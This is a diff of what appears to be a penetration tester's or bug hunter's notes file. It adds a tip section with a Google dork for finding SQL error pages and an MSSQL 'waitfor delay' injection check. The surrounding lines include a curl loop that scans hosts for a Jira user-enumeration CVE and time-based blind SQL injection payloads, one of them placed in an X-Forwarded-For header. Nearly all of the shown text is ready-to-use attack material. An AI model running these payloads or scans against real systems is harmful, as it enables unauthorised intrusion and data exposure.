@@ -152,6 +152,9 @@ java -jar -Xmx512M -Djava.awt.headless=true ./burpsuite_pro_v1.8.8.jar http exmp
   go to
   to find endpoint of redirect request filter in proxy hisotry : put in filter => Request.Query CONTAINS "=https" => find xss , open redirect , rxss 
   
+  
+  
+  
   ----------------------------------------------------------------------------------------------
   jira exploit 
   cve 2020-14179	=> jira
@@ -165,6 +168,9 @@ cve 2020-14181
 
 cat hosts.txt | while read host do; do curl -s -k --insecure "$host/secure/ViewUserHover.jspa"|grep -qsi "User does not exist"&&
 \printf "$host\033[0;31mVulnerable\n"||printf "$host \033[0;32mNot Vulnerable\n";done
+
+
+
   
   -------------------------------------------------------------------------------------------------
   
@@ -416,6 +422,14 @@ sleep payload
  X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
 Type: time-based blind on SignUp form
 Payload: Parameter=randomtext%' OR SLEEP (5) #
+
+
+Tip:
+1. using SQL errors Dork:
+site:http://target.com intext:"sql syntax near" |  intext:"incorrect syntax near"
+
+2. indexed page with sql error
+3. Confirmed with "waitfor delay'0:0:15'--"
 
 
 ----------------------------------------------------------------------------------------------
